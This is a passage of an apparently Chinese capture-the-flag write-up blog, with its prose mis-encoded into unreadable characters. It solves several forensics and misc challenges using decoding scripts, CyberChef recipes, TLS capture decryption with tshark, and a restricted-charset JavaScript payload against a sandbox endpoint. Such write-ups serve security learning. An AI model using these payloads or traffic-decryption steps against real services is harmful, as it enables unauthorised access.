i));</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™ä¸ªè„šæœ¬æŠŠä¸Šè¿°ä»£ç å¤åˆ»ä¸€éï¼Œå¾—åˆ° flagã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">input</span> = [<span class="number">67</span>, <span class="number">83</span>, <span class="number">68</span>, <span class="number">120</span>, <span class="number">62</span>, <span class="number">109</span>, <span class="number">95</span>, <span class="number">90</span>, <span class="number">92</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">73</span>, <span class="number">99</span>, <span class="number">82</span>, <span class="number">53</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">92</span>, <span class="number">80</span>, <span class="number">89</span>, <span class="number">81</span>, <span class="number">104</span>]</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">input</span>)):</span><br><span class="line">    output += <span class="built_in">chr</span>(x + <span class="built_in">input</span>[x])</span><br><span class="line"><span class="built_in">print</span>(output)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;Bready_To_Crumble&#125;</span><br></pre></td></tr></table></figure><h3 id="CTF2019-babyflash"><a href="#CTF2019-babyflash" class="headerlink" title="[*CTF2019]babyflash"></a>[*CTF2019]babyflash</h3><p>JPEXS Free Flash Decompiler åç¼–è¯‘ä¸€ä¸‹ swf æ–‡ä»¶å¯ä»¥å¾—åˆ° 441 å¼ å›¾ç‰‡ï¼Œè¿™ä¸ªæ•°é‡æ­£å¥½æ˜¯ 21 çš„å¹³æ–¹ï¼Œè€ƒè™‘ä¸€ä¸‹æ˜¯äºŒç»´ç ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619252584536/5d1200faf250cd0ba59755072ae8fd8076967fe7.png" alt="image-20210424162301782"></p><p>å°†æ‰€æœ‰å›¾ç‰‡æ–‡ä»¶åä½¿ç”¨ <code>dir /b</code> æå–å‡ºæ¥å¹¶æ’å¥½åºï¼Œç„¶åä½¿ç”¨æŒ‡ä»¤ <code>for /f &quot;skip=1&quot; %%a in (files.txt) do certutil -hashfile %%a MD5&gt;&gt;md5.txt</code> è®¡ç®—å‡ºå›¾ç‰‡çš„ MD5ã€‚è¡¥å…¨ç¬¬ä¸€ä¸ªå›¾ç‰‡çš„ MD5 åæ•´ç†å¯å¾—å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111111100110001111111100000100111001000001101110101011001011101101110100100101011101101110100101101011101100000100110001000001111111101010101111111000000001010100000000111011111011111000100110110011011101111011101101111001101111011010010001100000000011111010100000100011000000000001011100110011111111101011100110101100000101101000100010101110101011011000001101110100101101110000101110101101110110001100000101011100010010111111101101100001011</span><br></pre></td></tr></table></figure><p>å¯ä½¿ç”¨å¦‚ä¸‹ receipt å¾—åˆ°å‰åŠæ®µ flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;0&#39;&#125;,&#39;\\xFF&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;1&#39;&#125;,&#39;\\x00&#39;,true,false,true,false)</span><br><span class="line">Generate_Image(&#39;Greyscale&#39;,12,21)</span><br><span class="line">Parse_QR_Code(false)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*ctf&#123;half_flag_&amp;</span><br></pre></td></tr></table></figure><p>å°† swf æ–‡ä»¶ä¸­çš„éŸ³é¢‘ä¹Ÿå¯¼å‡ºï¼Œä½¿ç”¨ Audition æ‰“å¼€åå¯çœ‹åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619254490264/cd2f0825de3b355b40503d04ad10850c9413471b.png"></p><p>å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*ctf&#123;half_flag_&amp;&amp;_the_rest&#125;</span><br></pre></td></tr></table></figure><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">- *ctf&#123;half_flag_&amp;&amp;_the_rest&#125; // original</span></span><br><span class="line"><span class="addition">+ flag&#123;halfflag&amp;&amp;_the_rest&#125; // flag for BUUOJ</span></span><br></pre></td></tr></table></figure><h3 id="INSHack2018-GCorp-Stage-1"><a href="#INSHack2018-GCorp-Stage-1" class="headerlink" title="[INSHack2018]GCorp - Stage 1"></a>[INSHack2018]GCorp - Stage 1</h3><p>ä½¿ç”¨ Wireshark åˆ†ææµé‡åŒ…ï¼Œè·Ÿè¸ª TCP æµï¼Œå¯ä»¥åœ¨æœ€åæ‰¾åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619713619333/f265f6fe03e57d2bc95f9015285a3ffe0ee84e31.png"></p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SU5TQXtjMTgwN2EwYjZkNzcxMzI3NGQ3YmYzYzY0Nzc1NjJhYzQ3NTcwZTQ1MmY3N2I3ZDIwMmI4MWUxNDkxNzJkNmE3fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>å°†å…¶ Base64 è§£ç ä¸€æ¬¡å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;c1807a0b6d7713274d7bf3c6477562ac47570e452f77b7d202b81e149172d6a7&#125;</span><br></pre></td></tr></table></figure><h3 id="HarekazeCTF2019-A-Z"><a href="#HarekazeCTF2019-A-Z" class="headerlink" title="[HarekazeCTF2019]A_Z"></a>[HarekazeCTF2019]A_Z</h3><p><code>/source</code>  é¡µé¢ä¸­å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹å…³é”®ä»£ç ç‰‡æ®µã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> output = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">const</span> code = req.query.code + <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span> (code &amp;&amp; code.length &lt; <span class="number">200</span> &amp;&amp; !<span class="regexp">/[^a-z().]/</span>.test(code)) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> result = vm.runInNewContext(code, &#123;&#125;, &#123; <span class="attr">timeout</span>: <span class="number">500</span> &#125;);</span><br><span class="line">      <span class="keyword">if</span> (result === <span class="number">1337</span>) &#123;</span><br><span class="line">        output = process.env.FLAG;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        output = <span class="string">&#x27;nope&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      output = <span class="string">&#x27;nope&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    output = <span class="string">&#x27;nope&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  res.render(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">title</span>: <span class="string">&#x27;[a-z().]&#x27;</span>, output &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å› æ­¤å…³é”®åœ¨äºå¦‚ä½•ä½¿ç”¨é™å®šçš„å­—ç¬¦é›† <code>a-z().</code> æ„é€ å‡º 1337 è¿™ä¸ªæ•°ã€‚é€šè¿‡å°è¯•å¯ä»¥å‘ç°å¦‚ä¸‹å‡ ç‚¹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">typeof</span>(self)) <span class="comment">// object</span></span><br><span class="line">(<span class="keyword">typeof</span>(self)).constructor.length <span class="comment">// 1</span></span><br><span class="line"><span class="literal">NaN</span>.constructor.length <span class="comment">// 1</span></span><br><span class="line"><span class="literal">true</span>.constructor.length <span class="comment">// 1</span></span><br><span class="line">(<span class="keyword">typeof</span>(self)).sub.name.length <span class="comment">// 3</span></span><br><span class="line">(<span class="keyword">typeof</span>(self)).replace.name.length <span class="comment">//7</span></span><br></pre></td></tr></table></figure><p>å› æ­¤å¯ä»¥æ„é€ å‡ºå¦‚ä¸‹è½½è·ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(((<span class="keyword">typeof</span>(self)).constructor()).concat(<span class="literal">true</span>.constructor.length).concat((<span class="keyword">typeof</span>(self)).sub.name.length).concat((<span class="keyword">typeof</span>(self)).sub.name.length).concat((<span class="keyword">typeof</span>(self)).replace.name.length))</span><br></pre></td></tr></table></figure><p>å°†è½½è·æäº¤å³å¯å¾—åˆ° flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8d58e39a-55b3-45b3-a0f4-c297774e4077&#125;</span><br></pre></td></tr></table></figure><h3 id="ç½‘é¼æ¯-2020-é’é¾™ç»„-è™šå¹»2"><a href="#ç½‘é¼æ¯-2020-é’é¾™ç»„-è™šå¹»2" class="headerlink" title="[ç½‘é¼æ¯ 2020 é’é¾™ç»„]è™šå¹»2"></a>[ç½‘é¼æ¯ 2020 é’é¾™ç»„]è™šå¹»2</h3><p>æ£€æµ‹é™„ä»¶çš„ç±»å‹å¯çŸ¥æ˜¯ä¸€å¼ å›¾ç‰‡ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">File type:   Portable Network Graphics image</span><br><span class="line">Extension:   png</span><br><span class="line">MIME type:   image&#x2F;png</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619757360271/90f7c54ea3f9a8c76011d7b2a05a17c6dbefa8bf.png"></p><p>çŒœæµ‹æ˜¯ä¸‰ä¸ªé¢œè‰²é€šé“ä¿¡æ¯çš„å åˆï¼ŒåŒæ—¶çœ‹ç»“æ„å¾ˆåƒæ˜¯æ±‰ä¿¡ç ã€‚å†™ä¸ªè„šæœ¬å°†å†…å®¹è¿˜åŸä¸€ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">image = Image.<span class="built_in">open</span>(<span class="string">&#x27;file.png&#x27;</span>)</span><br><span class="line">pixels = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">36</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">12</span>):</span><br><span class="line">        pixel = image.getpixel((i, j))</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">3</span>):</span><br><span class="line">            pixels += (<span class="string">&#x27;1&#x27;</span> <span class="keyword">if</span> pixel[k] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(pixels)</span><br></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬å¯ä»¥å¾—åˆ°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000011111110000110111111110011111110000010000000001100111101100000000010000010111110000000110110110011111010000010100000001010100111111000001010000010101110001010110110001011101010000010101110010010101010000011101010000010101110100110100010000011101010000000000000101010101111001000000000000000000000000010101001100111011000000001101100011010110000000100100100000001111101010000101010011100000110000010101000010110111111001111000000000010001101001100110011001111110000000000000000000000110001000001111000000011111111111111111110010010001010000011101001001000010110000111101000000011101010000101101110011010110100000010101010100110111001110010001110000010000101100001000101111000011110000011010110000111111101110100101110000011011011110010011110111101100010000011101001110010100001011001000110000000110111000100110111010000000000000000000000101110101111101000000000000010101110001111000000000011101010000010101110010000000000000011101010000010101110101011000000000011101010000010100000100000000000000000001010000010111110010110000000000011111010000010000000000000000000000000000010000011111110011000000000000011111110000000000000000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹çš„ CyberChef Receipt å¯ä»¥ç”Ÿæˆå›¾ç‰‡ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;1&#39;&#125;,&#39;\\x00&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;0&#39;&#125;,&#39;\\xff&#39;,true,false,true,false)</span><br><span class="line">Generate_Image(&#39;Greyscale&#39;,8,36)</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619758126695/8d3d19307f83033960293ab3218d7ba9eb7db210.png@100w"></p><p>å°†å›¾ç‰‡ç¨å¾®å¤„ç†ä¸€ä¸‹ï¼Œå†å¡«å……ä¸€ä¸‹ç©ºç™½å¤„ï¼Œä½¿ç”¨æ±‰ä¿¡ç çš„ app æ‰«æå³å¯å¾—åˆ° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619759293831/ffc0d6b42993834fcf636e9c42879f555fbe1408.png@100w" alt="image-20210430130813382"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;eed70c7d-e530-49ba-ad45-80fdb7872e0a&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2019-Passthru"><a href="#INSHack2019-Passthru" class="headerlink" title="[INSHack2019]Passthru"></a>[INSHack2019]Passthru</h3><p>ç”¨ Wireshark è½½å…¥é™„ä»¶ä¸­çš„ sslkey ååˆ†ææµé‡åŒ…ï¼Œå¯ä»¥å‘ç°å¾ˆå¤šå«æœ‰ <code>kcahsni</code> çš„è¯·æ±‚ï¼Œå°†å…¶åå†™å¯å¾— <code>inshack</code>ï¼Œå› æ­¤æ¨æµ‹å…¶ä¸ flag ç›¸å…³ã€‚ä½¿ç”¨ tshark å°†è¯·æ±‚çš„å‚æ•°å†…å®¹å–å‡ºã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r capture.pcap -o &quot;tls.keylog_file:sslkey.log&quot; -Y &quot;http contains \&quot;GET &#x2F;searchbyimage\&quot;&quot; -T fields -e http.request.uri.query.parameter &gt; data.txt</span><br></pre></td></tr></table></figure><p>å°†å–å‡ºçš„æ•°æ®ä½¿ç”¨å¦‚ä¸‹ CyberChef Receipt å¤„ç†å³å¯å¾—åˆ°å«æœ‰ flag çš„å­—ç¬¦ä¸²ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL_Decode()</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;^i(.*)&amp;kcahsni&#x3D;&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;,(.*)$\\n&#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">From_Hex(&#39;Auto&#39;)</span><br><span class="line">Reverse(&#39;Character&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;b274dddb2c7707ebe430dadcf1245c246713502d6e9579f00acd10a83f3da95e&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2019-Crunchy"><a href="#INSHack2019-Crunchy" class="headerlink" title="[INSHack2019]Crunchy"></a>[INSHack2019]Crunchy</h3><p>é™„ä»¶ç»™å‡ºçš„ä»£ç å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crunchy</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span>: <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">return</span> <span class="number">6</span> * crunchy(n - <span class="number">1</span>) + crunchy(n - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">g = <span class="number">17665922529512695488143524113273224470194093921285273353477875204196603230641896039854934719468650093602325707751568</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Your flag is: INSA&#123;%d&#125;&quot;</span>%(crunchy(g)%<span class="number">100000007</span>))</span><br></pre></td></tr></table></figure><p>ç”±äºæ•°å­—å¤ªå¤§å¯¼è‡´é€’å½’è¶…å‡ºäº†èŒƒå›´ï¼Œå°è¯•ç”¨ SageMath æ¥è§£å‡ºã€‚SageMath ä¸­æä¾›äº†ä¸€ä¸ªåŒ…å¯ä»¥ç”¨æ¥å¿«é€Ÿç®—å‡ºæ–æ³¢é‚£å¥‘æ•°åˆ—ã€‚</p><blockquote><p><a href="https://doc.sagemath.org/html/en/reference/combinat/sage/combinat/binary_recurrence_sequences.html">https://doc.sagemath.org/html/en/reference/combinat/sage/combinat/binary_recurrence_sequences.html</a></p></blockquote><p>æ­¤æ—¶åªéœ€è¦å†™ä¸ªè„šæœ¬è§£å‡ºç­”æ¡ˆå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g = <span class="number">17665922529512695488143524113273224470194093921285273353477875204196603230641896039854934719468650093602325707751568</span></span><br><span class="line">modNum = <span class="number">100000007</span></span><br><span class="line">binaryRecurrenceSequence = BinaryRecurrenceSequence(<span class="number">6</span>, <span class="number">1</span>)</span><br><span class="line">period = binaryRecurrenceSequence.period(modNum)</span><br><span class="line"><span class="built_in">print</span>(binaryRecurrenceSequence(g % period) % modNum)</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619781699640/51fec9fdb628f17abfff1e39c0ff74afa1457d27.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;41322239&#125;</span><br></pre></td></tr></table></figure><h3 id="WMCTF2020-è¡Œä¸ºè‰ºæœ¯"><a href="#WMCTF2020-è¡Œä¸ºè‰ºæœ¯" class="headerlink" title="[WMCTF2020]è¡Œä¸ºè‰ºæœ¯"></a>[WMCTF2020]è¡Œä¸ºè‰ºæœ¯</h3><p>é™„ä»¶ç»™å‡ºäº†ä¸€å¼ å›¾ç‰‡ï¼Œ010 æ‰“å¼€è¿è¡Œæ¨¡æ¿å¾—åˆ° CRC Mismatch æç¤ºåæ ¹æ® <code>hex: 0x380 0x284</code> ä¿®æ­£å…¶é«˜åº¦ï¼Œå³å¯å¾—åˆ°ä¸‹å›¾ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619783064801/3ffc54440bf441f4c148ba8cecb921cf5b035da1.png"></p><p>ç•¥å¾®è¯»ä¸€ä¸‹å†…å®¹å¾ˆå®¹æ˜“å‘ç°å›¾ç‰‡çš„æ•°å­—ä¸­æœ‰ä¸€ä¸ªå‹ç¼©æ–‡æ¡£ï¼Œå°†å›¾ç‰‡å†…å®¹è½¬å†™ä¸‹æ¥å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">504B0304140000000800DB93C55086A39007D8000000DF01000008000000666C61672E74787475504B0E823010DD93708771DDCCB0270D5BBD0371815A9148AC6951C2ED9D271F89C62E2693D7F76BB7DE9FC80D2E6E68E782A326D2E01F81CE6D55E76972E9BA7BCCB3ACEF7B89F7B6E90EA16A6EE2439D45179ECDD1C5CCFB6B9AA489C1218C92B898779D765FCCBB58CC920B6662C5F91749931132258F32BBA7C288C5AE103133106608409DAC419F77241A3412907814AB7A922106B8DED0D25AEC8A634929025C46A33FE5A1D3167A100323B1ABEE4A7A0708413A19E17718165F5D3E73D577798E36D5144B66315AAE315078F5E51A29246AF402504B01021F00140009000800DB93C55086A39007D8000000DF010000080024000000000000002000000000000000666C61672E7478740A00200000000000010018004A0A9A64243BD601F9D8AB39243BD6012D00CA13223BD601504B050600000000010001005A000000FE00000000000000</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹çš„ CyberChef Receipt å¯å¾—åˆ°ä¸‹ä¸€æ­¥çš„ä¿¡æ¯ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">From_Hex(&#39;None&#39;)</span><br><span class="line">Unzip(&#39;&#39;,false)</span><br><span class="line">Decode_text(&#39;UTF-8 (65001)&#39;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Good eyes! Here is your flag:</span><br><span class="line">https:&#x2F;&#x2F;www.splitbrain.org&#x2F;services&#x2F;ook</span><br><span class="line"></span><br><span class="line">+++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- .&lt;+++ [-&gt;-- -&lt;]&gt;-</span><br><span class="line">.&lt;+++ +[-&gt;+ +++&lt;] &gt;+.&lt;+ ++[-&gt; ---&lt;] &gt;---- -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;++</span><br><span class="line">++.-- --.&lt;+ +++[- &gt;---- &lt;]&gt;-- ----. +++++ +++.&lt; +++[- &gt;---&lt; ]&gt;-.+ ++.++</span><br><span class="line">+++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- .+++. -.... --.++ +.&lt;++ +[-&gt;+ ++&lt;]&gt; ++++. &lt;++++</span><br><span class="line">++++[ -&gt;--- ----- &lt;]&gt;-- ----- ----- --.&lt;+ +++[- &gt;++++ &lt;]&gt;+. +...&lt; +++++</span><br><span class="line">+++[- &gt;++++ ++++&lt; ]&gt;+++ +++++ +++.. .-.&lt;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¿¡æ¯ä¸­çš„ç½‘ç«™è¿›è¡Œ Brainfuck to Text å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WMCTF&#123;wai_bi_baaaa_bo!2333~~~&#125;</span><br></pre></td></tr></table></figure><h3 id="ç¾ŠåŸæ¯-2020-é€ƒç¦»ä¸œå—äºš"><a href="#ç¾ŠåŸæ¯-2020-é€ƒç¦»ä¸œå—äºš" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]é€ƒç¦»ä¸œå—äºš"></a>[ç¾ŠåŸæ¯ 2020]é€ƒç¦»ä¸œå—äºš</h3><p>é™„ä»¶è§£å‹åå¾—åˆ°ä¸‰ä¸ªæ—¥è®°å‹ç¼©æ–‡æ¡£ï¼Œç¬¬ä¸€ä¸ªæ‰“å¼€åæœ‰ä¸€å¼ å›¾ç‰‡ã€‚010 editor æ‰“å¼€åå¯çŸ¥éœ€è¦ä¿®å¤å›¾ç‰‡å®½é«˜ã€‚å°†å…¶ä¾ç…§è„šæœ¬çˆ†ç ´ç»“æœ <code>hex: 0xf9 0x12c</code> ä¿®å¤åå¯å¾—ä¸‹å›¾ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1619784523989/9dd75ab600acad5e77d2d49666fbbf7e92b5f96b.png" alt="image-20210430200843458"></p><p>å°† <code>wdnmd</code> ä½œä¸ºå‹ç¼©åŒ…å¯†ç è§£å‹æ—¥è®° 2 å‹ç¼©æ–‡æ¡£å¯å¾—ä¸€ä¸² Brainfuck å’Œä¸€ä¸ªéŸ³é¢‘ã€‚åœ¨ Brainfuck å‰é¢è¡¥å……ä¸Š 8 ä¸ª <code>+</code> å³å¯è§£ç æˆåŠŸå¹¶å¾—åˆ°ä¸€ä¸² Base64ã€‚ä½¿ç”¨ CyberChef è§£ç åæ£€æµ‹æ–‡ä»¶ç±»å‹å¯çŸ¥å…¶æ˜¯ä¸€ä¸ª ELF æ–‡ä»¶ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">File type:   Executable and Linkable Format</span><br><span class="line">Extension:   elf,bin,axf,o,prx,so</span><br><span class="line">MIME type:   application&#x2F;x-executable</span><br><span class="line">Description: Executable and Linkable Format file. No standard file extension.</span><br></pre></td></tr></table></figure><p>å°†å…¶ç”¨ IDA æ‰“å¼€å¯ä»¥å¾—åˆ°å¦‚ä¸‹æºç ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;hei~what you want??&quot;</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;want a flag? &quot;</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span 